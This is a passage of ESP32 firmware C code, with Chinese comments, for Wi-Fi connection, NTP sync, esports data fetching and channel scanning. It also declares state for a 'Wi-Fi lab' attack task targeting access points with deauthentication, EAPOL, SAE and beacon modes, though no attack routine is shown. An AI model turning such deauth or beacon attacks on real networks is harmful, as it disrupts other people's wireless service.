// main/net/app_net.c —— 联网服务实现：Wi-Fi STA、NTP 校时、赛事拉取与热点配网。
//
// 设计要点（与 app_net.h 的约定一致）：
//   * 离线优先：设备上只有本模块会打开 Wi-Fi 射频，且只在明确请求时打开。赛事中心 /
//     校时 / 配网结束时立即释放，不做后台常驻联网。
//   * 不阻塞 UI：所有网络请求都在内部 worker task 里跑，页面回调只读状态。
//   * 线程安全：对 app_state 的写入只发生在 worker task；共享的 fetch / leagues 状态
//     用一个互斥锁保护。
//   * 凭证存 NVS 命名空间 "net"（key "ssid"/"pass"），不使用 Wi-Fi 驱动的隐式 flash
//     存储（esp_wifi_set_storage(WIFI_STORAGE_RAM)）。
#include "app_net.h"

#include "app_assets.h"
#include "app_ble.h"
#include "app_metrics.h"
#include "app_novel.h"
#include "app_state.h"
#include "logic/app_anim.h"
#include "logic/app_badge.h"
#include "logic/app_esports.h"
#include "logic/app_pomodoro.h"
#include "logic/app_wifilab.h"
#include "logic/app_qr.h"
#include "logic/app_time.h"
#include "logic/app_totp.h"
#include "logic/app_vault.h"
#include "logic/app_vcard.h"

#include "cJSON.h"
#include "esp_crt_bundle.h"
#include "esp_event.h"
#include "esp_heap_caps.h"
#include "esp_http_client.h"
#include "esp_http_server.h"
#include "esp_log.h"
#include "esp_netif.h"
#include "esp_netif_sntp.h"
#include "esp_system.h"
#include "esp_timer.h"
#include "esp_wifi.h"
#include "nvs.h"
#include "nvs_flash.h"

#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"
#include "freertos/task.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

static const char *TAG = "app_net";

// ---------------------------------------------------------------------------
// 常量
// ---------------------------------------------------------------------------

#define NET_NVS_NS "net"          // 凭证命名空间
#define NET_SSID_KEY "ssid"
#define NET_PASS_KEY "pass"

#define LOLESPORTS_BASE "https://esports-api.lolesports.com/persisted/gw/"
// 对局实时数据 feed（阵容、经济、选手），与 persisted/gw 不同域。
#define LOLESPORTS_FEED "https://feed.lolesports.com/livestats/v1/window/"
// lolesports 官网公开使用的 API key。
#define LOLESPORTS_KEY "0TvQnueqKa5mxJntVWt0w4LpLfEkrV1Ta8rQBb9Z"

#define NET_HTTP_MAX_BODY (64 * 1024)   // 单次响应上限，超出即失败
#define NET_HTTP_TIMEOUT_MS 8000

#define NET_LEAGUE_MAX 16
#define NET_LEAGUE_NAME_LEN 24
#define NET_LEAGUE_SLUG_LEN 24

#define PROV_SSID "FoloPassport"
#define PROV_PASS "folotoy123"          // >= 8 位，满足 WPA2 要求
#define PROV_URL "http://192.168.4.1/"

// ---------------------------------------------------------------------------
// 模块状态
// ---------------------------------------------------------------------------

static bool s_inited;
static SemaphoreHandle_t s_lock;   // 保护 fetch / leagues / prov note 等共享状态

// Wi-Fi 栈
static bool s_wifi_inited;         // esp_wifi_init 成功
static bool s_wifi_started;        // esp_wifi_start 成功
static bool s_sta_wanted;          // 上层是否希望保持 STA 连接
static esp_netif_t *s_sta_netif;
static esp_netif_t *s_ap_netif;

// 赛事拉取
static bool s_worker_running;              // esports worker 是否在跑
static volatile bool s_esports_in_center;  // 用户是否停留在赛事中心
static app_fetch_state_t s_fetch_state = APP_FETCH_IDLE;
static char s_fetch_error[64];

// 单场对局详情拉取（与赛程拉取串行，共用 s_worker_running 门闩）
static bool s_detail_running;
static app_fetch_state_t s_detail_state = APP_FETCH_IDLE;
static char s_detail_error[64];

// 异步校时
static bool s_time_running;
static app_fetch_state_t s_time_state = APP_FETCH_IDLE;
static char s_time_error[64];

// 信道体检（一次性扫描）
static bool s_channel_running;
static app_fetch_state_t s_channel_state = APP_FETCH_IDLE;
static char s_channel_error[64];
static app_channel_report_t s_channel_report;
static bool s_channel_valid;

// HTTPS 前的系统时钟兜底：见 ensure_system_clock()。
static portMUX_TYPE s_clock_mux = portMUX_INITIALIZER_UNLOCKED;
static bool s_clock_sync_tried;

// 配网
static httpd_handle_t s_httpd;
static bool s_prov_active;
static char s_prov_note[80];

// Wi-Fi 实验（仅自有 / 授权环境）：单射频互斥角色
static bool s_wifilab_running;              // 攻击任务是否在跑（受 s_lock 保护）
static volatile bool s_wifilab_active;      // 攻击循环退出标志（攻击任务自读）
static app_wifilab_mode_t s_wifilab_mode;
static app_wifilab_beacon_t s_wifilab_beacon;
static uint8_t s_wifilab_bssid[6];          // 目标 AP 的 BSSID（DEAUTH/EAPOL/SAE 用）
static int s_wifilab_channel;               // 目标信道
static uint32_t s_wifilab_seed;
static char s_wifilab_ssid[33];             // 目标 SSID（BEACON_AP_LIST / 展示用）
static size_t s_wifilab_ssid_len;
static volatile uint32_t s_wifilab_sent;    // 驱动接受（ESP_OK）的帧数（攻击任务自增）
static volatile uint32_t s_wifilab_failed;  // 驱动拒绝的帧数（攻击任务自增）
static esp_err_t s_wifilab_tx_err;          // 首个发射错误码；ESP_OK 表示尚未出错
static char s_wifilab_tx_reason[40];        // 首个发射错误的一句话，供界面显示
static bool s_wifilab_was_started;          // 射频是不是本角色借来的（决定停止时是否释放）
static TaskHandle_t s_wifilab_task;         // 攻击任务句柄
static esp_err_t s_wifilab_err;             // 最近一次开启结果
static char s_wifilab_reason[72];           // 失败一句话原因
static QueueHandle_t s_wifilab_req_q;        // 异步请求队列
static TaskHandle_t s_wifilab_req_task;

// ---------------------------------------------------------------------------
// 小工具
// ---------------------------------------------------------------------------

static inline void net_lock(void)
{
    if (s_lock) xSemaphoreTake(s_lock, portMAX_DELAY);
}

static inline void net_unlock(void)
{
    if (s_lock) xSemaphoreGive(s_lock);
}

// 截断复制，始终以 NUL 结尾。
static void copy_trunc(char *dst, size_t cap, const char *src)
{
    if (cap == 0) return;
    if (!src) { dst[0] = '\0'; return; }
    size_t n = strlen(src);
    if (n > cap - 1) n = cap - 1;
    memcpy(dst, src, n);
    dst[n] = '\0';
}

// Howard Hinnant days_from_civil：公历日期 -> 1970-01-01 起的天数。
// 与 app_state.c 保持一致，避免依赖 newlib 的时区表。
static int64_t net_days_from_civil(int y, unsigned m, unsigned d)
{
    y -= m <= 2;
    const int64_t era = (y >= 0 ? y : y - 399) / 400;
    const unsigned yoe = (unsigned)(y - era * 400);
    const unsigned doy = (153 * (m + (m > 2 ? -3 : 9)) + 2) / 5 + d - 1;
    const unsigned doe = yoe * 365 + yoe / 4 - yoe / 100 + doy;
    return era * 146097 + (int64_t)doe - 719468;
}

// 解析 ISO8601 UTC 时间（形如 "2026-09-24T09:00:00Z"）为 Unix 秒；失败返回 0。
static int iso_utc_to_unix(const char *text)
{
    if (!text) return 0;
    int y = 0, mo = 0, d = 0, h = 0, mi = 0, se = 0;
    if (sscanf(text, "%d-%d-%dT%d:%d:%d", &y, &mo, &d, &h, &mi, &se) != 6) return 0;
    if (y < 1970 || y > 2099 || mo < 1 || mo > 12 || d < 1 || d > 31) return 0;
    if (h < 0 || h > 23 || mi < 0 || mi > 59 || se < 0 || se > 60) return 0;

    int64_t days = net_days_from_civil(y, (unsigned)mo, (unsigned)d);
    int64_t v = days * 86400 + (int64_t)h * 3600 + (int64_t)mi * 60 + se;
    if (v <= 0) return 0;
    return (int)v;
}

// URL 解码：%XX 与 '+'（表单编码）。
static void url_decode(char *text)
{
    char *w = text;
    for (char *r = text; *r; r++) {
        if (*r == '%' && r[1] && r[2]) {
            int hi = -1, lo = -1;
            char c1 = r[1], c2 = r[2];
            if (c1 >= '0' && c1 <= '9') hi = c1 - '0';
            else if (c1 >= 'a' && c1 <= 'f') hi = c1 - 'a' + 10;
            else if (c1 >= 'A' && c1 <= 'F') hi = c1 - 'A' + 10;
            if (c2 >= '0' && c2 <= '9') lo = c2 - '0';
            else if (c2 >= 'a' && c2 <= 'f') lo = c2 - 'a' + 10;
            else if (c2 >= 'A' && c2 <= 'F') lo = c2 - 'A' + 10;
            if (hi >= 0 && lo >= 0) {
                *w++ = (char)(hi * 16 + lo);
                r += 2;
                continue;
            }
        } else if (*r == '+') {
            *w++ = ' ';
            continue;
        }
        *w++ = *r;
    }
    *w = '\0';
}

// cJSON 便捷访问
static const char *json_str(const cJSON *obj, const char *key)
{
    const cJSON *it = cJSON_GetObjectItemCaseSensitive(obj, key);
    return (cJSON_IsString(it) && it->valuestring) ? it->valuestring : NULL;
}

static const cJSON *json_obj(const cJSON *obj, const char *key)
{
    return cJSON_GetObjectItemCaseSensitive(obj, key);
}

static int json_int(const cJSON *obj, const char *key, int def)
{
    const cJSON *it = cJSON_GetObjectItemCaseSensitive(obj, key);
    return cJSON_IsNumber(it) ? it->valueint : def;
}

// ---------------------------------------------------------------------------
// NVS 凭证
// ---------------------------------------------------------------------------

static bool nvs_read_creds(char *ssid, size_t ssid_cap, char *pass, size_t pass_cap)
{
    nvs_handle_t h;
    if (nvs_open(NET_NVS_NS, NVS_READONLY, &h) != ESP_OK) return false;

    size_t len = ssid_cap;
    esp_err_t err = nvs_get_str(h, NET_SSID_KEY, ssid, &len);
    if (err != ESP_OK || ssid[0] == '\0') {
        nvs_close(h);
        return false;
    }
    len = pass_cap;
    if (nvs_get_str(h, NET_PASS_KEY, pass, &len) != ESP_OK) {
        pass[0] = '\0';
    }
    nvs_close(h);
    return true;
}

static esp_err_t nvs_write_creds(const char *ssid, const char *pass)
{
    nvs_handle_t h;
    esp_err_t err = nvs_open(NET_NVS_NS, NVS_READWRITE, &h);
    if (err != ESP_OK) return err;

    err = nvs_set_str(h, NET_SSID_KEY, ssid);
    if (err == ESP_OK) err = nvs_set_str(h, NET_PASS_KEY, pass ? pass : "");
    if (err == ESP_OK) err = nvs_commit(h);
    nvs_close(h);
    return err;
}

// ---------------------------------------------------------------------------
// Wi-Fi 事件
// ---------------------------------------------------------------------------

static void on_wifi_event(void *arg, esp_event_base_t base, int32_t id, void *data)
{
    (void)arg;
    (void)base;
    switch (id) {
    case WIFI_EVENT_STA_CONNECTED: {
        const wifi_event_sta_connected_t *e = (const wifi_event_sta_connected_t *)data;
        char ssid[33] = { 0 };
        if (e) {
            size_t n = e->ssid_len;
            if (n > sizeof(ssid) - 1) n = sizeof(ssid) - 1;
            memcpy(ssid, e->ssid, n);
        }
        // 已关联 AP，等待 DHCP 分配 IP。
        app_state_set_net(APP_NET_CONNECTING, ssid[0] ? ssid : NULL);
        break;
    }
    case WIFI_EVENT_STA_DISCONNECTED:
        app_state_set_net(APP_NET_OFF, NULL);
        break;
    default:
        break;
    }
}

static void on_ip_event(void *arg, esp_event_base_t base, int32_t id, void *data)
{
    (void)arg;
    (void)base;
    (void)data;
    if (id == IP_EVENT_STA_GOT_IP) {
        app_state_set_net(APP_NET_ONLINE, NULL);
    }
}

// ---------------------------------------------------------------------------
// Wi-Fi STA
// ---------------------------------------------------------------------------

// 确保 Wi-Fi 驱动已 init 且 start（不配置 STA 参数）。失败回滚。
static esp_err_t wifi_ensure_started(void)
{
    if (s_wifi_started) return ESP_OK;

    if (!s_wifi_inited) {
        wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
        esp_err_t err = esp_wifi_init(&cfg);
        if (err != ESP_OK) return err;
        s_wifi_inited = true;
        // 凭证自己管，关掉驱动隐式 flash 存储。
        esp_wifi_set_storage(WIFI_STORAGE_RAM);
    }

    esp_err_t err = esp_wifi_set_mode(s_prov_active ? WIFI_MODE_APSTA : WIFI_MODE_STA);
    if (err != ESP_OK) return err;
    err = esp_wifi_start();
    if (err != ESP_OK) return err;
    s_wifi_started = true;
    return ESP_OK;
}

static void fill_sta_config(wifi_config_t *sta, const char *ssid, const char *pass)
{
    memset(sta, 0, sizeof(*sta));
    strncpy((char *)sta->sta.ssid, ssid, sizeof(sta->sta.ssid) - 1);
    if (pass) strncpy((char *)sta->sta.password, pass, sizeof(sta->sta.password) - 1);
    sta->sta.threshold.authmode = WIFI_AUTH_WPA2_PSK;
}

esp_err_t app_net_wifi_start(void)
{
    if (!s_inited) return ESP_ERR_INVALID_STATE;

    s_sta_wanted = true;

    if (s_wifi_started) {
        app_net_state_t st = app_state_net();
        if (st == APP_NET_ONLINE || st == APP_NET_CONNECTING) return ESP_OK;
        // Wi-Fi 已开（例如热点配网），只需补上 STA 配置并连接。
    }

    char ssid[33] = { 0 };
    char pass[65] = { 0 };
    if (!nvs_read_creds(ssid, sizeof(ssid), pass, sizeof(pass))) {
        s_sta_wanted = false;
        return ESP_ERR_NOT_FOUND;
    }

    esp_err_t err = wifi_ensure_started();
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Wi-Fi 启动失败: %s", esp_err_to_name(err));
        return err;
    }

    if (s_prov_active) esp_wifi_set_mode(WIFI_MODE_APSTA);

    wifi_config_t wc;
    fill_sta_config(&wc, ssid, pass);
    err = esp_wifi_set_config(WIFI_IF_STA, &wc);
    if (err != ESP_OK) return err;

    app_state_set_net(APP_NET_CONNECTING, ssid);
    err = esp_wifi_connect();
    if (err != ESP_OK && err != ESP_ERR_WIFI_CONN) return err;
    return ESP_OK;
}

void app_net_wifi_stop(void)
{
    s_sta_wanted = false;

    if (!s_wifi_started) {
        app_state_set_net(APP_NET_OFF, NULL);
        return;
    }

    if (s_prov_active) {
        // 配网进行中：只断开 STA，保留 AP。
        esp_wifi_disconnect();
        esp_wifi_set_mode(WIFI_MODE_AP);
    } else {
        esp_wifi_disconnect();
        esp_wifi_stop();
        s_wifi_started = false;
        if (s_wifi_inited) {
            esp_wifi_deinit();     // 真正释放射频
            s_wifi_inited = false;
        }
    }
    app_state_set_net(APP_NET_OFF, NULL);
}

bool app_net_wifi_connected(void)
{
    return app_state_net() == APP_NET_ONLINE;
}

esp_err_t app_net_wifi_set_credentials(const char *ssid, const char *password)
{
    if (!ssid || ssid[0] == '\0') return ESP_ERR_INVALID_ARG;

    esp_err_t err = nvs_write_creds(ssid, password);
    if (err != ESP_OK) return err;

    app_state_set_net(APP_NET_CONNECTING, ssid);
    s_sta_wanted = true;

    if (s_wifi_started) {
        // 已启动则立即用新凭证重连。
        esp_wifi_disconnect();
        wifi_config_t wc;
        fill_sta_config(&wc, ssid, password);
        esp_wifi_set_config(WIFI_IF_STA, &wc);
        esp_wifi_connect();
    }
    return ESP_OK;
}

bool app_net_has_credentials(void)
{
    nvs_handle_t h;
    if (nvs_open(NET_NVS_NS, NVS_READONLY, &h) != ESP_OK) return false;
    size_t len = 0;
    esp_err_t err = nvs_get_str(h, NET_SSID_KEY, NULL, &len);
    nvs_close(h);
    return err == ESP_OK && len > 1;   // len 含结尾 NUL
}

const char *app_net_saved_ssid(void)
{
    static char buf[33];
    char pass[65];
    if (!nvs_read_creds(buf, sizeof(buf), pass, sizeof(pass))) buf[0] = '\0';
    return buf;
}

esp_err_t app_net_wifi_radio_up(void)
{
    if (!s_inited) return ESP_ERR_INVALID_STATE;
    return wifi_ensure_started();
}

// ---------------------------------------------------------------------------
// NTP 校时
// ---------------------------------------------------------------------------

esp_err_t app_net_sync_time(void)
{
    if (app_state_net() != APP_NET_ONLINE) return ESP_ERR_INVALID_STATE;

#if CONFIG_LWIP_SNTP_MAX_SERVERS >= 2
    const esp_sntp_config_t sntp_cfg =
        ESP_NETIF_SNTP_DEFAULT_CONFIG_MULTIPLE(2,
            ESP_SNTP_SERVER_LIST("ntp.aliyun.com", "pool.ntp.org"));
#else
    // 默认配置只允许一个服务器，用国内源优先。
    const esp_sntp_config_t sntp_cfg = ESP_NETIF_SNTP_DEFAULT_CONFIG("ntp.aliyun.com");
#endif

    esp_err_t err = esp_netif_sntp_init(&sntp_cfg);
    if (err != ESP_OK) return err;

    err = esp_netif_sntp_sync_wait(pdMS_TO_TICKS(8000));
    if (err != ESP_OK) {
        esp_netif_sntp_deinit();
        return ESP_ERR_TIMEOUT;
    }

    time_t utc = time(NULL);
    int offset = app_state_settings()->utc_offset_minutes * 60;
    time_t local = utc + offset;
    struct tm tmv;
    if (!gmtime_r(&local, &tmv)) {
        esp_netif_sntp_deinit();
        return ESP_FAIL;
    }

    app_datetime_t dt = {
        .year = tmv.tm_year + 1900,
        .month = tmv.tm_mon + 1,
        .day = tmv.tm_mday,
        .hour = tmv.tm_hour,
        .minute = tmv.tm_min,
        .second = tmv.tm_sec,
    };
    app_state_set_time(&dt, "NTP");
    esp_netif_sntp_deinit();
    return ESP_OK;
}

// ---------------------------------------------------------------------------
// HTTP 客户端辅助
// ---------------------------------------------------------------------------

// 系统时钟是否可用于证书校验：设备没有 RTC，重启后 time(NULL) 从 1970 起算，
// 这里用 2020-01-01 作为"显然未校准"的下界。
#define NET_CLOCK_MIN_VALID 1577836800
static bool net_clock_is_set(void)
{
    return time(NULL) >= (time_t)NET_CLOCK_MIN_VALID;
}

// HTTPS 的前置条件：mbedTLS 用系统时钟校验服务器证书的有效期。本轮开机若还没有任何一次
// 成功的校准（自动校时被拦、超时，或用户还没校过时），系统时钟仍是 1970，所有 HTTPS 都会
// 以"证书尚未生效"失败——界面却只显示一句"请求失败"。这里在请求前兜底做一次 SNTP；失败
// 不阻断请求，但错误文案会写明"系统时间未校准"。每次开机自动兜底只做一次，避免每次请求
// 都白等最多 8 秒。
static void ensure_system_clock(void)
{
    if (net_clock_is_set()) return;

    portENTER_CRITICAL(&s_clock_mux);
    bool do_sync = !s_clock_sync_tried;
    s_clock_sync_tried = true;
    portEXIT_CRITICAL(&s_clock_mux);

    if (!do_sync) return;

    esp_err_t err = app_net_sync_time();
    if (err == ESP_OK) {
        ESP_LOGI(TAG, "HTTPS 前系统时钟未设置，SNTP 已校准");
        return;
    }

    ESP_LOGW(TAG, "HTTPS 前系统时钟未设置，SNTP 校准失败: %s", esp_err_to_name(err));
    if (err == ESP_ERR_INVALID_STATE) {
        // 当前没联网（例如离线时打开了积分榜）。这次不算"已经试过"：等联网后的请求
        // 再补一次，否则这一轮开机的 HTTPS 会一直卡在时间未校准上。
        portENTER_CRITICAL(&s_clock_mux);
        s_clock_sync_tried = false;
        portEXIT_CRITICAL(&s_clock_mux);
    }
}

// 把一句给人看的失败原因写进调用方的缓冲（写不下就截断）。
static void http_set_error(char *errbuf, size_t errcap, const char *text)
{
    if (errbuf && errcap) copy_trunc(errbuf, errcap, text);
}

// 发 GET 请求并读取响应体。成功时 *out 为 malloc 出来的 NUL 结尾缓冲，调用方负责 free。
// 失败时把具体原因写进 errbuf（可为 NULL）：以前所有失败都只有调用方那句笼统的
// "请求失败"，连接失败、证书/时间问题、服务非 2xx、响应过大、内存不足全部长一个样，
// 在拿不到日志的设备上无法定位。
static esp_err_t http_get_json(const char *url, char **out, int *out_len,
                               char *errbuf, size_t errcap)
{
    if (out) *out = NULL;
    if (out_len) *out_len = 0;
    if (errbuf && errcap) errbuf[0] = '\0';

    // 先保证系统时钟可用：HTTPS 的证书校验依赖它。
    ensure_system_clock();

    esp_http_client_config_t cfg = {
        .url = url,
        .method = HTTP_METHOD_GET,
        .timeout_ms = NET_HTTP_TIMEOUT_MS,
        .buffer_size = 2048,
        .user_agent = "FoloPassport/1.0",
        .crt_bundle_attach = esp_crt_bundle_attach,
    };
    esp_http_client_handle_t client = esp_http_client_init(&cfg);
    if (!client) {
        ESP_LOGE(TAG, "GET %s 失败: 客户端初始化内存不足", url);
        http_set_error(errbuf, errcap, "内存不足");
        return ESP_ERR_NO_MEM;
    }

    esp_http_client_set_header(client, "x-api-key", LOLESPORTS_KEY);
    esp_http_client_set_header(client, "Accept", "application/json");

    esp_err_t err = esp_http_client_open(client, 0);
    if (err != ESP_OK) {
        // 打开阶段包含 DNS、TCP 与 TLS 握手。时钟没校准时的 TLS 失败要单独说清楚，
        // 否则用户只会看到一个没法排查的"请求失败"。
        ESP_LOGE(TAG, "GET %s 打开失败: %s（系统时钟%s）", url, esp_err_to_name(err),
                 net_clock_is_set() ? "已校准" : "未校准");
        http_set_error(errbuf, errcap,
                       net_clock_is_set() ? "网络连接失败" : "系统时间未校准");
        esp_http_client_cleanup(client);
        return err;
    }

    esp_http_client_fetch_headers(client);
    int status = esp_http_client_get_status_code(client);
    if (status < 200 || status >= 300) {
        ESP_LOGE(TAG, "GET %s 返回 HTTP %d", url, status);
        char msg[32];
        snprintf(msg, sizeof(msg), "服务返回 %d", status);
        http_set_error(errbuf, errcap, msg);
        esp_http_client_close(client);
        esp_http_client_cleanup(client);
        return ESP_ERR_INVALID_RESPONSE;
    }

    // 不要再一次性 malloc(NET_HTTP_MAX_BODY)（64 KB）：无 PSRAM 的 C3 上，应用常驻
    // 状态 + LVGL 池 + Wi-Fi 栈已经吃掉大半内部 RAM，64 KB 连续块时有时无，失败时就是
    // 界面上那句"内存不足"。改为按需增长：已知长度就按长度精确分配，未知（分块传输）
    // 从 4 KB 起按倍翻倍，峰值只到实际正文大小——正常响应通常几 KB 到十几 KB。
    int hint = esp_http_client_get_content_length(client);
    if (hint > NET_HTTP_MAX_BODY) {
        ESP_LOGE(TAG, "GET %s 响应 %d 字节超过上限 %d", url, hint, NET_HTTP_MAX_BODY);
        http_set_error(errbuf, errcap, "响应过大");
        esp_http_client_close(client);
        esp_http_client_cleanup(client);
        return ESP_ERR_INVALID_SIZE;
    }
    int cap = (hint > 0) ? hint : 4096;
    char *buf = (char *)malloc((size_t)cap + 1);
    if (!buf) {
        ESP_LOGE(TAG, "GET %s 分配 %d 字节失败（最大连续块 %u）", url, cap,
                 (unsigned)heap_caps_get_largest_free_block(MALLOC_CAP_8BIT));
        http_set_error(errbuf, errcap, "内存不足");
        esp_http_client_close(client);
        esp_http_client_cleanup(client);
        return ESP_ERR_NO_MEM;
    }

    int total = 0;
    bool too_big = false;
    for (;;) {
        if (total == cap) {
            if (cap >= NET_HTTP_MAX_BODY) { too_big = true; break; }
            int ncap = cap * 2;
            if (ncap > NET_HTTP_MAX_BODY) ncap = NET_HTTP_MAX_BODY;
            char *nb = (char *)realloc(buf, (size_t)ncap + 1);
            if (!nb) { err = ESP_ERR_NO_MEM; break; }
            buf = nb;
            cap = ncap;
        }
        int r = esp_http_client_read(client, buf + total, cap - total);
        if (r < 0) { err = ESP_FAIL; break; }
        if (r == 0) break;
        total += r;
    }

    esp_http_client_close(client);
    esp_http_client_cleanup(client);

    if (err != ESP_OK) {
        ESP_LOGE(TAG, "GET %s 读取失败: %s（已读 %d 字节）", url, esp_err_to_name(err), total);
        http_set_error(errbuf, errcap, "数据接收中断");
        free(buf);
        return err;
    }
    if (too_big) {
        ESP_LOGE(TAG, "GET %s 响应超过上限 %d 字节", url, NET_HTTP_MAX_BODY);
        http_set_error(errbuf, errcap, "响应过大");
        free(buf);
        return ESP_ERR_INVALID_SIZE;
    }

    buf[total] = '\0';
    if (out) *out = buf;
    if (out_len) *out_len = total;
    return ESP_OK;
}

// 按需拉起 Wi-Fi 并等待联网（最长约 12 秒）。
static bool ensure_online(void)
{
    if (app_state_net() == APP_NET_ONLINE) return true;
    if (app_net_wifi_start() != ESP_OK) return false;
    for (int i = 0; i < 60; i++) {
        if (app_state_net() == APP_NET_ONLINE) return true;
        vTaskDelay(pdMS_TO_TICKS(200));
    }
    return app_state_net() == APP_NET_ONLINE;
}

// ---------------------------------------------------------------------------
// 异步校时 worker
// ---------------------------------------------------------------------------

static void time_worker(void *arg)
{
    (void)arg;
    app_fetch_state_t final = APP_FETCH_FAILED;
    char err[64] = { 0 };

    if (!ensure_online()) {
        copy_trunc(err, sizeof(err), "未联网");
        goto done;
    }
    if (app_net_sync_time() != ESP_OK) {
        copy_trunc(err, sizeof(err), "校时超时");
        goto done;
    }
    final = APP_FETCH_OK;

done:
    net_lock();
    s_time_state = final;
    if (final == APP_FETCH_OK) {
        s_time_error[0] = '\0';
    } else {
        copy_trunc(s_time_error, sizeof(s_time_error), err[0] ? err : "校时失败");
    }
    bool in_center = s_esports_in_center;
    bool esports_busy = s_worker_running || s_detail_running;
    s_time_running = false;
    net_unlock();

    // 校时不构成常驻联网的理由：赛事中心不在用、也没有赛事拉取在跑时释放射频。
    if (!in_center && !esports_busy) app_net_wifi_stop();
    app_metrics_stack("net_time 退出");
    vTaskDelete(NULL);
}

void app_net_time_sync_request(void)
{
    if (!s_inited) return;

    net_lock();
    if (s_time_running) {
        net_unlock();
        return;   // 运行中重复调用忽略
    }
    s_time_running = true;
    s_time_state = APP_FETCH_RUNNING;
    s_time_error[0] = '\0';
    net_unlock();

    if (xTaskCreate(time_worker, "net_time", 4096, NULL, 4, NULL) != pdPASS) {
        net_lock();
        s_time_running = false;
        s_time_state = APP_FETCH_FAILED;
        copy_trunc(s_time_error, sizeof(s_time_error), "任务创建失败");
        net_unlock();
        ESP_LOGE(TAG, "校时任务创建失败");
    }
}

app_fetch_state_t app_net_time_state(void)
{
    net_lock();
    app_fetch_state_t st = s_time_state;
    net_unlock();
    return st;
}

const char *app_net_time_error(void)
{
    static char buf[64];
    net_lock();
    if (s_time_state == APP_FETCH_FAILED && s_time_error[0]) {
        copy_trunc(buf, sizeof(buf), s_time_error);
    } else {
        buf[0] = '\0';
    }
    net_unlock();
    return buf;
}

// ---------------------------------------------------------------------------
// 信道体检 worker
// ---------------------------------------------------------------------------

// 一次扫描最多统计这么多 AP。典型宿舍/办公楼 2.4G 也就十几个，48 足够，
// 再多只是把同一批 AP 的重复记录算两次。
#define CHANNEL_SCAN_MAX_AP 48

// 把驱动的 authmode 映射成 app_channel 的本地短标签枚举。映射只在这一个地方做：
// app_channel 因此不必 include esp_wifi，界面也只需认一套中文标签。混合模式
// (WPA_WPA2_PSK)、企业级按它实际支持的最高档归类，方便用户一眼判断加密强度；
// 本工具不细分的模式（如 WAPI）统一落到"未知"，不冒充开放网络。
static app_channel_sec_t channel_sec_from_authmode(wifi_auth_mode_t mode)
{
    switch (mode) {
    case WIFI_AUTH_OPEN:          return APP_CHANNEL_SEC_OPEN;
    case WIFI_AUTH_WEP:           return APP_CHANNEL_SEC_WEP;
    case WIFI_AUTH_WPA_PSK:       return APP_CHANNEL_SEC_WPA;
    case WIFI_AUTH_WPA2_PSK:
    case WIFI_AUTH_WPA2_ENTERPRISE:
    case WIFI_AUTH_WPA_WPA2_PSK:  return APP_CHANNEL_SEC_WPA2;
    case WIFI_AUTH_WPA3_PSK:
    case WIFI_AUTH_WPA2_WPA3_PSK: return APP_CHANNEL_SEC_WPA3;
    default:                      return APP_CHANNEL_SEC_UNKNOWN;
    }
}

static void channel_worker(void *arg)
{
    (void)arg;

    // 报告含 48 条热点明细（每条约 42 字节），放栈上会吃掉 2KB 以上；任务栈只有几千
    // 字节，还要留给 esp_wifi 调用链。放静态区，并用 s_channel_running 保证同一时刻
    // 只有一个 worker 在写它。
    static app_channel_report_t report;
    app_channel_reset(&report);
    app_fetch_state_t final = APP_FETCH_FAILED;
    char err[64] = { 0 };

    // 记下"射频是不是本来就已经开着"：本来没开的话，扫完要还回去，不能因为一次
    // 信道体检验就让 Wi-Fi 常驻。
    net_lock();
    bool was_started = s_wifi_started;
    net_unlock();

    if (wifi_ensure_started() != ESP_OK) {
        copy_trunc(err, sizeof(err), "Wi-Fi 启动失败");
        goto done;
    }

    wifi_scan_config_t cfg = { 0 };
    cfg.show_hidden = true;      // 隐藏 SSID 的 AP 同样占信道，要算进来
    if (esp_wifi_scan_start(&cfg, true) != ESP_OK) {
        copy_trunc(err, sizeof(err), "扫描失败");
        goto cleanup;
    }

    uint16_t ap_num = 0;
    if (esp_wifi_scan_get_ap_num(&ap_num) != ESP_OK) {
        copy_trunc(err, sizeof(err), "读取扫描结果失败");
        goto cleanup;
    }

    uint16_t n = ap_num;
    if (n > CHANNEL_SCAN_MAX_AP) n = CHANNEL_SCAN_MAX_AP;
    wifi_ap_record_t *recs = calloc(n ? n : 1, sizeof(*recs));
    if (!recs) {
        copy_trunc(err, sizeof(err), "内存不足");
        goto cleanup;
    }
    if (n > 0 && esp_wifi_scan_get_ap_records(&n, recs) == ESP_OK) {
        for (uint16_t i = 0; i < n; i++) {
            // 隐藏 SSID 时驱动给出的 ssid 为空串，这里按长度 0 处理，明细页会显示
            // "隐藏网络"。BSSID 一并带上，方便同一 SSID 的多个 AP 区分开。
            const char *ssid = (const char *)recs[i].ssid;
            int ssid_len = 0;
            while (ssid_len < 32 && ssid[ssid_len] != '\0') ssid_len++;
            app_channel_add_ap(&report, recs[i].primary, recs[i].rssi,
                               ssid, ssid_len, recs[i].bssid,
                               channel_sec_from_authmode(recs[i].authmode));
        }
    }
    free(recs);
    app_channel_finish(&report);
    final = APP_FETCH_OK;

cleanup:
    // 只还回去"自己借来的"射频；配网热点期间更不能关。
    if (!was_started && !s_prov_active) app_net_wifi_stop();

done:
    net_lock();
    s_channel_state = final;
    if (final == APP_FETCH_OK) {
        s_channel_report = report;
        s_channel_valid = true;
        s_channel_error[0] = '\0';
    } else {
        copy_trunc(s_channel_error, sizeof(s_channel_error),
                   err[0] ? err : "扫描失败");
    }
    s_channel_running = false;
    net_unlock();
    app_metrics_stack("net_channel 退出");
    vTaskDelete(NULL);
}

void app_net_channel_scan_request(void)
{
    if (!s_inited) return;

    // 射频互斥：蓝牙（找设备 / 万能遥控）正占着 2.4G 时直接拒绝，不启动扫描。两者
    // 抢同一路射频，硬开会让扫描和蓝牙双双不稳；这里把失败原因写成一句人话，界面
    // 原样显示，用户知道"先去退出哪个页面"。
    if (app_ble_active()) {
        net_lock();
        s_channel_running = false;
        s_channel_state = APP_FETCH_FAILED;
        copy_trunc(s_channel_error, sizeof(s_channel_error),
                   "蓝牙正在使用（找设备/万能遥控），请先退出该页再扫描");
        net_unlock();
        return;
    }
    // 同理：Wi-Fi 实验正在发射时拒绝启动扫描（硬互斥，单一 2.4G 射频）。
    if (app_net_wifilab_running()) {
        net_lock();
        s_channel_running = false;
        s_channel_state = APP_FETCH_FAILED;
        copy_trunc(s_channel_error, sizeof(s_channel_error),
                   "Wi-Fi 实验正在发射，请先退出该页再扫描");
        net_unlock();
        return;
    }

    net_lock();
